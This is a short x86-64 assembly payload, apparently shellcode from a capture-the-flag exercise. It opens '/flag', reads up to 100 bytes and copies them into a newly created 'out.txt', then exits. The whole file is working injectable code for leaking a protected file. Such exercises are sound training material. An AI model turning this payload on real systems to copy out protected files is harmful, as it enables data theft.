.global _start

_start:
.intel_syntax noprefix
    mov r9, 0x7478742e74756f
    push r9
    push rsp
    pop rdi

    push 0x41
    pop rsi
    push 0x1b6
    pop rdx
    push 2
    pop rax
    syscall
    mov r9, rax

    mov r8, 0x67616c662f
    push r8
    push rsp
    pop rdi
    
    push 0
    pop rsi
    push 2
    pop rax

    syscall

    push rax

    pop rdi
    push rsp
    pop rsi 
    push 100
    pop rdx
    push 0
    pop rax
    syscall

    mov rdi, r9

    mov rdx, rax
    mov rax, 1
    syscall

    push 42
    pop rdi
    push 60
    pop rax
    syscall